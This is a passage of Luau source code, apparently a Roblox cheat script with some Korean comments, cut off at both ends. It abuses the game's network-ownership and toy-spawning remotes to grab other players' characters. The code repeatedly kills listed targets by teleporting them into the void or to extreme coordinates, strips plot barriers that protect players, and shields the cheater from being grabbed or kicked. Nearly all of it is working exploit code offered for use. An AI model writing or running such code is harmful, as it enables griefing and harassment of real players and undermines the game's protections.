                                hrp:FindFirstChild("FirePlayerPart"),
                            }
                            for _, tPart in ipairs(targetParts) do
                                if tPart and weld.Part1 == tPart then
                                    local basePart = item.PrimaryPart or sticky
                                    if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                        rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                        sticky.CFrame = CFrame.new(0,9999,0)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)

	hrp.CFrame = CFrame.new(myHrp.CFrame.X, myHrp.CFrame.Y +50, myHrp.CFrame.Z)
	myHrp.CFrame = hrp.CFrame
        BlobMassless(currentBlobS, hrp, "Right")

        if originCF then
            BACK(originCF)
        end

        return true
    end

    task.spawn(function()
        while blobLoopT do
            for i, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)
                if not player then --or table.find(Whitelist, name) then
                    continue
                end

                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then
                    continue
                end

                local character = player.Character
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                local hrp = character and character:FindFirstChild("HumanoidRootPart")

                if hrp and hrp:IsA("BasePart") and hrp.Massless and not isRiding then
                    continue
                end

                if humanoid and humanoid.Health > 0 then
                    if processedHumanoids[player] ~= humanoid then
                        local success = processPlayer(player)
                        if success then
                            processedHumanoids[player] = humanoid
                        end
                    end
                else
                    processedHumanoids[player] = nil
                end
                task.wait(0.05)
            end
            task.wait(0.3)
        end
    end)
end

function loopPlayerBlobF2() -- 블롭 룹2
    UpdateCurrentBlobman()

    local seat = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
    if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
        return false
    end

    local isRiding = seat and seat.Parent and seat.Parent.Name == "CreatureBlobman"

    local function processPlayer(player)
        if not player then return false end

        local _, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local character = player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then return false end

if hrp then
            BlobGrab(currentBlobS, hrp, "Right")
            BlobRelease(currentBlobS, hrp, "Right")
            if LoopBringMODED then humanoid.Sit = true end
			if LoopReleaseMODED and player.InPlot.Value then hrp.CFrame = CFrame.new(0, 500, 0) end
            task.wait(0.03)
            BlobGrab(currentBlobS, hrp, "Right")
            if LoopBringMODED then humanoid.Sit = false end
			if LoopReleaseMODED and player.InPlot.Value then hrp.CFrame = CFrame.new(0, 500, 0) end
        end

        return true
    end

    task.spawn(function()
        while blobLoopT2 do
            for i, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)
                if not player then --or table.find(Whitelist, name) then
                    continue
                end

                if PPs:FindFirstChild(name) then
                    continue
                end

                local character = player.Character
                local hrp = character and character:FindFirstChild("HumanoidRootPart")

                if hrp.Massless == true and not isRiding then
                    continue
                end

                processPlayer(player)
                task.wait(0.01)
            end
            task.wait(0.01)
        end
    end)
end
 
function loopPlayerF() -- 룹1
    UpdateCurrentBlobman()

    local currentProcessing = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local myChar = plr and plr.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while loopPlayerT do
            if not player or not player.Character or not player.Character:FindFirstChild("Head") then break end
            
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            local ownerTag = head:FindFirstChild("PartOwner")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if humanoid then

            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)

            if humanoid.RigType ~= Enum.HumanoidRigType.R15 and humanoid.SeatPart == nil then humanoid.RigType = Enum.HumanoidRigType.R15 end

            if humanoid.BreakJointsOnDeath == true and humanoid.SeatPart == nil then humanoid.BreakJointsOnDeath = false end

            if head:FindFirstChildOfClass("BallSocketConstraint") then head.BallSocketConstraint.Attachment0 = nil end

            local FallenY = workspace.FallenPartsDestroyHeight
            local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
            local storso = character:FindFirstChild("Torso")
            local ownerTag = head:FindFirstChild("PartOwner")

            if storso then --and ownerTag.Value == plr.Name then
                storso.CFrame = CFrame.new(storso.Position.X, targetY, storso.Position.Z)
            end
        end

        if originCF then BACK(originCF) end
        return true
    end

    task.spawn(function()
        while loopPlayerT do
            for _, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)

                if player and not table.find(Whitelist, player.Name) then
                    if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health > 0 then
                        if not currentProcessing[player] then
                            currentProcessing[player] = true

                            task.spawn(function()
                                local success = processPlayer(player)

                                if success then
                                    task.wait(2)
                                end

                                currentProcessing[player] = nil
                            end)
                        end
                    else
                        currentProcessing[player] = nil
                    end
                else
                    if player then
                        currentProcessing[player] = nil
                    end
                end
            end
            task.wait(0.05)
        end
    end)
end

function loopPlayerF2() -- 룹2
    UpdateCurrentBlobman()

    local processedHumanoids = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local myChar = plr and plr.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while loopPlayerT2 do
            rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
            --local ownerTag = head:FindFirstChild("PartOwner")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        local targetNames = {
            "NinjaKunai", "NinjaShuriken", "NinjaKatana",
            "ToolCleaver", "ToolDiggingForkRusty",
            "ToolPencil", "ToolPickaxe"
        }

        for _, child in ipairs(workspace:GetChildren()) do
            if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                for _, item in ipairs(child:GetChildren()) do
                    if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                        local sticky = item.StickyPart
                        local weld = sticky:FindFirstChild("StickyWeld")

                        if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                            local targetParts = {
                                character:FindFirstChild("Head"),
                                character:FindFirstChild("Torso"),
                                character:FindFirstChild("Left Arm"),
                                character:FindFirstChild("Left Leg"),
                                character:FindFirstChild("Right Arm"),
                                character:FindFirstChild("Right Leg"),
                                hrp:FindFirstChild("RagdollTouchedHitbox"),
                                hrp:FindFirstChild("FirePlayerPart"),
                            }

                            for _, tPart in ipairs(targetParts) do
                                if tPart and weld.Part1 == tPart then
                                    local basePart = item.PrimaryPart or sticky
                                    if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                        rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)

        hrp.CFrame = CFrame.new(99999999, 99999999, 99999999)

        task.spawn(function()
            while loopPlayerT2 do
                if hrp and hrp.Parent and hrp.Position.Y < 99999 then
                    local innerTP = true
                    task.spawn(function()
                        while innerTP do
                            local ok, cf = TP(player)
                            if ok and cf then
                                CF = cf
                            end
                            task.wait()
                        end
                    end)

                    while loopPlayerT2 do
                        rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                        local ownerTag = head:FindFirstChild("PartOwner")
                        if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                            break
                        end
                        task.wait()
                    end

                    innerTP = false
                    rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
                    hrp.CFrame = CFrame.new(99999999, 99999999, 99999999)
                end
                task.wait()
            end
        end)

        if originCF then
            BACK(originCF)
        end

        return true
    end

    task.spawn(function()
        while loopPlayerT2 do
            for _, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)
                if player and not table.find(Whitelist, player.Name) then
                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                    if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                    if humanoid and humanoid.Health > 0 then
                        if processedHumanoids[player] ~= humanoid then
                            local success = processPlayer(player)
                            if success then
                                processedHumanoids[player] = humanoid
                            end
                        end
                    else
                        processedHumanoids[player] = nil
                    end
                    task.wait(0.05)
                end
            end
            task.wait(0.05)
        end
    end)
end

function loopPlayerF3() -- 룹3
    UpdateCurrentBlobman()

    local currentProcessing = {}

    local function processPlayer(player)
        if not player then return false end

        local character, hrp, head = safeGetCharacterParts(player)
        if not hrp or not head then return false end

        local myChar = plr and plr.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHrp then return false end
        local originCF = myHrp.CFrame

        local tpRunning = true
        task.spawn(function()
            while tpRunning do
                local ok, cf = TP(player)
                if ok and cf then
                    CF = cf
                end
                task.wait()
            end
        end)

        while loopPlayerT3 do
            if not player or not player.Character or not player.Character:FindFirstChild("Head") then break end

            local ownerTag = head:FindFirstChild("FAKE")
            if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                break
            end
            task.wait()
        end

        tpRunning = false

        if originCF then BACK(originCF) end
        return true
    end

    task.spawn(function()
        while loopPlayerT3 do
            for _, name in ipairs(playersInLoop2V) do
                local player = game.Players:FindFirstChild(name)

                if player and not table.find(Whitelist, player.Name) then
                    if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                    local character = player.Character
                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health > 0 then
                        if not currentProcessing[player] then
                            currentProcessing[player] = true

                            task.spawn(function()
                                local success = processPlayer(player)

                                if success then
                                    task.wait(2)
                                end

                                currentProcessing[player] = nil
                            end)
                        end
                    else
                        currentProcessing[player] = nil
                    end
                else
                    if player then
                        currentProcessing[player] = nil
                    end
                end
            end
            task.wait(0.0005)
        end
    end)
end
 


function AntiStickyGBF()
    if not AntiStickyGBT then
        return
    end

    while AntiStickyGBT do
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then 
            task.wait(0.1)
            continue
        end

        local desk = inv:FindFirstChild("WD")

        if not desk then
            local spawnRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
            if spawnRemote then
                local offset = hrp.CFrame.LookVector * -24
                local spawnCF = hrp.CFrame + Vector3.new(0, 0, 0) + offset
                task.spawn(function()
                    pcall(function()
                        spawnRemote:InvokeServer("SprayCanWD", spawnCF, spawnCF.Position)
                    end)
                end)
                task.wait(0.00001)

                for _, item in pairs(inv:GetChildren()) do
                    if item.Name == "SprayCanWD" then
                        item.Name = "WD"
                        desk = item
                        break
                    end
                end
            end

            if not desk then
                task.wait(0.01)
                continue
            end
        end

        local main = desk:FindFirstChild("Main")
        if main then
            local bp = main:FindFirstChildOfClass("BodyPosition")
            if not bp then
                bp = Instance.new("BodyPosition")
                bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bp.Position = Vector3.new(hrp.CFrame.X, 600, hrp.CFrame.Z)
                bp.Parent = main
            else
                bp.Position = Vector3.new(hrp.CFrame.X, 600, hrp.CFrame.Z)
            end
        end

        local hitbox = desk:FindFirstChild("Hitbox")
        if not hitbox then
            task.wait(0.1)
            continue
        end

        local partOwner = hitbox:FindFirstChild("PartOwner")
        if not partOwner or partOwner.Value ~= plr.Name then
            rs.GrabEvents.SetNetworkOwner:FireServer(hitbox, hitbox.CFrame)
            task.wait(0.01)
            partOwner = hitbox:FindFirstChild("PartOwner")
            if not partOwner or partOwner.Value ~= plr.Name then
                task.wait(0.1)
                continue
            end
        end

        local hitbox2 = desk:FindFirstChild("StickyRemoverPart")
        if not hitbox2 then
            task.wait(0.01)
            continue
        end

        local validRoots = {}
        for _, name in ipairs(playersInLoop1V) do
            local player = game.Players:FindFirstChild(name)
            if player and player.Character then
                local root = player.Character:FindFirstChild("HumanoidRootPart") 
                if root and not playersInPlotsFolder:FindFirstChild(name) then
                    table.insert(validRoots, root)
                end
            end
        end

        if #validRoots > 0 then
            for _, targetRoot in ipairs(validRoots) do
                if targetRoot then
                    local behindCFrame = targetRoot.CFrame * CFrame.new(1,0,3)
                    hitbox2.CFrame = behindCFrame
                    task.wait()
                end
            end
        end

        task.wait(0.05)
    end
end

function RagdollGrabF()
    if not RagdollGrabT then
        local deskToRemove = inv:FindFirstChild("RB")
        if deskToRemove then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(deskToRemove)
            end
        end
        return
    end

    while RagdollGrabT and task.wait() do
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then
            continue
        end

        local desk = inv:FindFirstChild("RB")

        if not desk then
            local spawnRemote = rs.MenuToys.SpawnToyRemoteFunction
            if spawnRemote then
                local offset = hrp.CFrame.LookVector * -24
                local spawnCF = hrp.CFrame + offset

                task.spawn(function()
                    pcall(function()
                        spawnRemote:InvokeServer("PalletLightBrown", spawnCF, spawnCF.Position)
task.wait(0.1)
                    end)

                    for attempt = 3, 3 do
                        for _, item in pairs(inv:GetChildren()) do
                            if item.Name == "PalletLightBrown" then
                                local soundPart = item:FindFirstChild("SoundPart")
                                if soundPart then
                                    for i = 3, 3 do
                                        pcall(function()
                                            rs.GrabEvents.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                                            rs.GrabEvents.SetNetworkOwner:FireServer(soundPart, hrp.CFrame)
                                        end)
                                    end

                                    local partOwner = soundPart:FindFirstChild("PartOwner")
                                    if partOwner and partOwner.Value == plr.Name then
                                        item.Name = "RB"
                                        return
                                    end
                                end
                            end
                        end
                        task.wait()
                    end
                end)

                task.wait()
                desk = inv:FindFirstChild("RB")
            end
        end

        if not desk then 
            continue 
        end

        pcall(function()
            for _, part in ipairs(desk:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)

        local soundPart = desk:FindFirstChild("SoundPart")
        if not soundPart then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(desk)
            end
            continue
        end

        local partOwner = soundPart:FindFirstChild("PartOwner")
        if not partOwner or partOwner.Value ~= plr.Name then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(desk)
            end
            continue
        end

        local targetFound = false

        for _, other in pairs(game:GetService("Players"):GetPlayers()) do
            if other ~= plr and other.Character and other.Character:FindFirstChild("Head") then
                local head = other.Character.Head
                local headPartOwner = head:FindFirstChild("PartOwner")
                local FreeKick = head:FindFirstChild("OwnerKickRagdoll")

                if (headPartOwner and headPartOwner:IsA("StringValue") and headPartOwner.Value == plr.Name) or 
                   (FreeKick and FreeKick:IsA("StringValue")) then

                    local humanoid = other.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local ragdolled = humanoid:FindFirstChild("Ragdolled")
                        if ragdolled and ragdolled:IsA("BoolValue") and ragdolled.Value then
                            continue
                        end
                    end

                    local otherHrp = other.Character:FindFirstChild("HumanoidRootPart")
                    if otherHrp then
                        soundPart.CFrame = CFrame.new(0,9999,0)
                        task.wait(0.01)
                        soundPart.CFrame = otherHrp.CFrame * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(0))
                        targetFound = true
                        break
                    end
                end
            end
        end

        local main = desk:FindFirstChild("Main")
        if main then
            local bp = main:FindFirstChildOfClass("BodyPosition")
            if not bp then
                bp = Instance.new("BodyPosition")
                bp.MaxForce = Vector3.new(999999, 999999, 999999)
                bp.P = 500000
                bp.D = 5000
                bp.Parent = main
            end

            if not targetFound then
                local highPosition = Vector3.new(0, 9999, 0)
                bp.Position = highPosition
                soundPart.CFrame = CFrame.new(highPosition)
            else
                bp.Position = soundPart.Position
            end
        end
    end

    if not RagdollGrabT then
        local deskToRemove = inv:FindFirstChild("RB")
        if deskToRemove then
            local destroyRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("DestroyToy")
            if destroyRemote then
                destroyRemote:FireServer(deskToRemove)
            end
        end
    end
end


local AntiKickF = function()
    local plr = game.Players.LocalPlayer
    local char = plr.Character
    if not char then return end

    if AntiGrabTP_Active then
        return
    end

    local inv = workspace:WaitForChild(plr.Name .. "SpawnedInToys")
    local rs = game:GetService("ReplicatedStorage")
    local StickyPartEvent = rs.PlayerEvents.StickyPartEvent
    local SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
    local SpawnToyRemoteFunction = rs.MenuToys.SpawnToyRemoteFunction
    local DestroyToy = rs.MenuToys.DestroyToy

    local function findMyPO()
        local myDisplayName = plr.DisplayName
        local myUserName = plr.Name
        local myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)
        
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" then
                for _, child in pairs(obj:GetChildren()) do
                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
                        return obj
                    end
                end
            end
        end
        return nil
    end

    while AntiKickT and char and char.Parent do
        if AntiGrabTP_Active then break end
        task.wait()

        local hrp = char:FindFirstChild("HumanoidRootPart")
        local torso = char:FindFirstChild("Torso")
        if not hrp or not torso then continue end

        local myPO = findMyPO()
        local referencePosition = hrp.Position
        if myPO then referencePosition = myPO.Position end

        local ragdollHitbox = hrp:FindFirstChild("RagdollTouchedHitbox")
        if not ragdollHitbox then continue end

        local stickyPartName = "NinjaShuriken"
        local targetValue = CFrame.new(0.05, -0.3, 0) * CFrame.Angles(190, 0, 0)

        local stickyPartFolder = inv:FindFirstChild(stickyPartName)
        local stickyPart = stickyPartFolder and stickyPartFolder:FindFirstChild("StickyPart")
        local soundPart = stickyPartFolder and stickyPartFolder:FindFirstChild("SoundPart")

        if not stickyPart then
            local success = pcall(function()
                task.spawn(function()
                    SpawnToyRemoteFunction:InvokeServer(stickyPartName, hrp.CFrame, Vector3.new(0, 0, 0))
                end)
            end)

            if not success then continue end

            for _ = 0, 30 do
                task.wait(0.0005)
                stickyPartFolder = inv:FindFirstChild(stickyPartName)
                if stickyPartFolder then break end
            end

            if not stickyPartFolder then continue end

            stickyPart = stickyPartFolder:FindFirstChild("StickyPart")
            soundPart = stickyPartFolder:FindFirstChild("SoundPart")

            if stickyPart then stickyPart.CanQuery = false end
            if soundPart then soundPart.CanQuery = false end

            if not stickyPart then continue end
            task.wait(0.01)
        end

        pcall(function()
            SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            if DestroyGrabLine then DestroyGrabLine:FireServer(stickyPart) end
        end)

        local stickyWeld = stickyPart:FindFirstChild("StickyWeld")

        if not stickyWeld or stickyWeld.Part1 ~= ragdollHitbox then
            StickyPartEvent:FireServer(stickyPart, ragdollHitbox, targetValue)

            for _ = 0, 20 do
                task.wait(0.01)
                stickyWeld = stickyPart:FindFirstChild("StickyWeld")
                if stickyWeld and stickyWeld.Part1 == ragdollHitbox then
                    break
                end
            end
        end

        if stickyWeld and stickyWeld.Part1 == ragdollHitbox then
            while stickyWeld and stickyWeld.Part1 == ragdollHitbox and ragdollHitbox.Parent do
                if not AntiKickT or AntiGrabTP_Active then break end
                task.wait(0.1)

                local currentFolder = inv:FindFirstChild(stickyPartName)
                if not currentFolder then break end

                local currentStickyPart = currentFolder:FindFirstChild("StickyPart")
                if not currentStickyPart then break end

                stickyWeld = currentStickyPart:FindFirstChild("StickyWeld")
                if not stickyWeld or stickyWeld.Part1 ~= ragdollHitbox then
                    break
                end
            end
        end

        if not AntiKickT or AntiGrabTP_Active then
            if stickyPartFolder and stickyPartFolder.Parent then
                pcall(function()
                    DestroyToy:FireServer(stickyPartFolder)
                end)
            end
            break
        end
    end
end


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local plr = Players.LocalPlayer

function AntiGrabStickyF()
    while AntiGrabStickyT and plr do
        task.wait(0.1)

        local char = plr.Character
        if not char or not char.Parent then
            continue
        end

        local inv = Workspace:WaitForChild(plr.Name.."SpawnedInToys", 5)
        if not inv then continue end

        local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
        local SetNetworkOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
        local SpawnToyRemoteFunction = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction") 
        local DestroyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")

        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        local head = char:FindFirstChild("Head")
        if not hrp or not hum or not head then
            continue
        end

        local agFolder = inv:FindFirstChild("AG")
        local stickyPart = agFolder and agFolder:FindFirstChild("StickyPart")

        local headPartOwner = head:FindFirstChild("PartOwner")
        local stickyWeld = stickyPart and stickyPart:FindFirstChild("StickyWeld")
        local targetPart = hrp:FindFirstChild("RagdollTouchedHitbox")

        if headPartOwner and stickyWeld and targetPart and stickyWeld.Part1 == targetPart then
            pcall(function()
                SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            end)

            if hum.Sit then
                hum.Sit = false
            end
            if not hum.AutoRotate then
                hum.AutoRotate = true
            end

            headPartOwner:Destroy()
        end

        if stickyWeld and targetPart and stickyWeld.Part1 ~= targetPart then
            pcall(function()
                SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
            end)
        end

        if stickyPart then
            local distance = (hrp.Position - stickyPart.Position).Magnitude
            if distance > 25 then
                pcall(function()
                    DestroyToy:FireServer(agFolder)
                end)
                task.wait(0.00001)
            else
                local partOwner = stickyPart:FindFirstChild("PartOwner")
                if not partOwner or partOwner.Value ~= plr.Name then
                    pcall(function()
                        SetNetworkOwner:FireServer(stickyPart, hrp.CFrame)
                    end)
                end

                local targetPartCheck = hrp:FindFirstChild("RagdollTouchedHitbox")
                local stickyWeldCheck = stickyPart:FindFirstChild("StickyWeld")

                if targetPartCheck and stickyPart then
                    if not stickyWeldCheck or stickyWeldCheck.Part1 ~= targetPartCheck then
                        pcall(function()
                            StickyPartEvent:FireServer(stickyPart, targetPartCheck, CFrame.new(0, -0.3, 0.3) * CFrame.Angles(190, 0, 0))
                        end)
                    end
                end
            end
        else
            local existingNinja = inv:FindFirstChild("AG")
            if not existingNinja then
                task.spawn(function()
                    pcall(function()
                        SpawnToyRemoteFunction:InvokeServer("NinjaShuriken", hrp.CFrame * CFrame.new(0,10,20), Vector3.new(0,0,0))
                    end)
                end)

                task.wait(0.00001)

                local newNinjaFolder = inv:FindFirstChild("NinjaShuriken")
                if newNinjaFolder then
                    local newStickyPart = newNinjaFolder:FindFirstChild("StickyPart")
                    if newStickyPart then
                        local distance = (hrp.Position - newStickyPart.Position).Magnitude
                        if distance <= 30 then
                            newNinjaFolder.Name = "AG"
                        else
                            pcall(function()
                                DestroyToy:FireServer(newNinjaFolder)
                            end)
                        end
                    end
                end
            else
                local newStickyPart = existingNinja:FindFirstChild("StickyPart")
                if newStickyPart then
                    local distance = (hrp.Position - newStickyPart.Position).Magnitude
                    if distance <= 30 then
                        existingNinja.Name = "AG"
                    end
                end
            end
        end
    end
end



    if not AntiKickT then
        local shurikenFolder = inv:FindFirstChild("NinjaShuriken")
        if shurikenFolder then
            pcall(function()
                DestroyToy:FireServer(shurikenFolder)
            end)
        end
    end


plr.CharacterAdded:Connect(function(newChar)
    newChar:WaitForChild("Humanoid")
    newChar:WaitForChild("HumanoidRootPart")
    task.wait(0.02)
    if AntiKickT and not AntiGrabTP_Active then
        AntiKickF()
    end
end)

Plots = workspace:WaitForChild("Plots")
function BarrierCanCollideF()
    if BarrierCanCollideT then
        for i = 1, 5 do
            local plot = Plots:FindFirstChild("Plot"..i)
            if plot and plot:FindFirstChild("Barrier") then
                for _, barrier in ipairs(plot.Barrier:GetChildren()) do
                    if barrier:IsA("BasePart") then
                        barrier.CanCollide = false
                    end
                end
            end
        end
    else
        for i = 1, 5 do
            local plot = Plots:FindFirstChild("Plot"..i)
            if plot and plot:FindFirstChild("Barrier") then
                for _, barrier in ipairs(plot.Barrier:GetChildren()) do
                    if barrier:IsA("BasePart") then
                        barrier.CanCollide = true
                    end
                end
            end
        end
    end
end


function AutoAttackF()
    task.spawn(function()
        local RunService = game:GetService("RunService")
        local savedTargets = {}
        local invName = plr.Name.."SpawnedInToys"
        
        while AutoAttackT do
            RunService.Heartbeat:Wait()

            for i = #savedTargets, 1, -1 do
                local t = savedTargets[i]
                local char = t and t.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if not (t and char and hum and hum.Health > 0) or t == plr then
                    table.remove(savedTargets, i)
                end
            end

            local myChar = plr.Character
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local myAttach = myHRP and myHRP:FindFirstChild("RootAttachment")

            if not (myChar and myHRP and myAttach) then
                continue
            end

            local function tryAddTarget(player)
                if player and player ~= plr and player.Character then
                    local exists = false
                    for _, v in ipairs(savedTargets) do
                        if v == player then exists = true; break end
                    end
                    if not exists then
                        table.insert(savedTargets, player)
                    end
                end
            end

            local head = myChar:FindFirstChild("Head")
            if head then
                local ownerVal = head:FindFirstChild("PartOwner")
                if ownerVal and ownerVal:IsA("StringValue") and ownerVal.Value ~= "" then
                    local foundPlayer = game.Players:FindFirstChild(ownerVal.Value)
                    tryAddTarget(foundPlayer)
                end
            end

            local inv = workspace:FindFirstChild(invName)
            if inv then
                for _, blob in ipairs(inv:GetChildren()) do
                    if blob.Name == "CreatureBlobman" and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                        for _, side in ipairs({"Left", "Right"}) do
                            local detector = blob:FindFirstChild(side.."Detector")
                            local weld = detector and detector:FindFirstChild(side.."Weld")
                            if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
                                local foundPlayer = game.Players:FindFirstChild(plr.Name) 
                                tryAddTarget(foundPlayer)
                            end
                        end
                    end
                end
            end

            for _, player in ipairs(game.Players:GetPlayers()) do
                if player ~= plr then
                    local invs = workspace:FindFirstChild(player.Name.."SpawnedInToys")
                    if invs then
                        for _, blob in ipairs(invs:GetChildren()) do
                            if blob.Name == "CreatureBlobman" and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                                for _, side in ipairs({"Left", "Right"}) do
                                    local detector = blob:FindFirstChild(side.."Detector")
                                    local weld = detector and detector:FindFirstChild(side.."Weld")
                                    if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
                                        tryAddTarget(player)
                                    end
                                end
                            end
                        end
                    end
                end
            end

            local plots = workspace:FindFirstChild("PlotItems")
            if plots then
                for i = 1, 5 do
                    local plot = plots:FindFirstChild("Plot"..i)
                    if plot then
                        for _, blob in ipairs(plot:GetChildren()) do
                            if blob.Name == "CreatureBlobman" and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                                for _, side in ipairs({"Left", "Right"}) do
                                    local detector = blob:FindFirstChild(side.."Detector")
                                    local weld = detector and detector:FindFirstChild(side.."Weld")
                                    if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
                                        local foundPlayer = game.Players:FindFirstChild("Plot "..i)
                                        tryAddTarget(foundPlayer)
                                    end
                                end
                            end
                        end
                    end
                end
            end

            for i = #savedTargets, 1, -1 do
                local target = savedTargets[i]

                if target == plr then 
                    table.remove(savedTargets, i)
                    continue 
                end

                local tChar = target.Character
                local hum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                local torso = tChar and tChar:FindFirstChild("Torso")
                local head = tChar and tChar:FindFirstChild("Head")

                if not (hum and torso and head and hum.Health > 0) then
                    table.remove(savedTargets, i)
                    continue
                end

                local isWhitelisted = false
                if WhiteListMode and Whitelist and typeof(Whitelist) == "table" then
                    for _, allowed in ipairs(Whitelist) do
                        if allowed == target.Name then isWhitelisted = true; break end
                    end
                end
                if isWhitelisted then continue end

                local myTorso = myChar:FindFirstChild("Torso")
                if not myTorso then continue end

                local distance = (torso.Position - myTorso.Position).Magnitude
                if distance <= 30 then
                    rs.GrabEvents.SetNetworkOwner:FireServer(torso, CFrame.lookAt(myTorso.Position, torso.Position))

                    if head then
                        local partOwner = head:FindFirstChild("PartOwner")
                        if partOwner and partOwner:IsA("StringValue") and partOwner.Value == plr.Name then
                            if hum.Health ~= 0 then
                                local FallenY = workspace.FallenPartsDestroyHeight
                                local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
                                torso.CFrame = CFrame.new(99999, targetY, 99999)
                            end
                        end
                    end
                end
            end
        end
    end)
end

plr.CharacterAdded:Connect(function(char)
